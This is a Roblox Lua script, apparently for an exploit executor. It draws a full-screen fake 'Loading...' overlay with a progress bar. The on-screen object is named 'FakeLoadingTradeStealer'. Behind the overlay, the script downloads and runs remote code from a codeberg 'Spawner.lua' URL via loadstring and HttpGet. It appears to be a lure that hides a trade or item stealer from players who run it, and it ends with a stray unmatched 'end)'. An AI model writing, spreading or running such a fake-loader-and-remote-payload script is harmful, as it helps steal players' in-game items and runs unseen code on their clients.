-- [LOADING SCREEN PART]
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "FakeLoadingTradeStealer"

-- Background Frame
local Background = Instance.new("Frame", ScreenGui)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

-- Loading Text
local LoadingText = Instance.new("TextLabel", Background)
LoadingText.Size = UDim2.new(0, 200, 0, 50)
LoadingText.Position = UDim2.new(0.5, -100, 0.4, 0)
LoadingText.Text = "Loading..."
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 28
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.BackgroundTransparency = 1

-- Progress Bar Background
local ProgressBarBG = Instance.new("Frame", Background)
ProgressBarBG.Size = UDim2.new(0, 300, 0, 20)
ProgressBarBG.Position = UDim2.new(0.5, -150, 0.5, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBarBG.BorderSizePixel = 0

-- Progress Bar Fill
local ProgressBarFill = Instance.new("Frame", ProgressBarBG)
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
ProgressBarFill.BorderSizePixel = 0

-- Animate Loading Progress
spawn(function()
    for i = 1, 100 do
        ProgressBarFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.05, true)
        LoadingText.Text = "Loading... " .. i .. "%"
        wait(0.05)
    end
end)

-- Wait for Animation to Complete
wait(5)

local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load()
end)
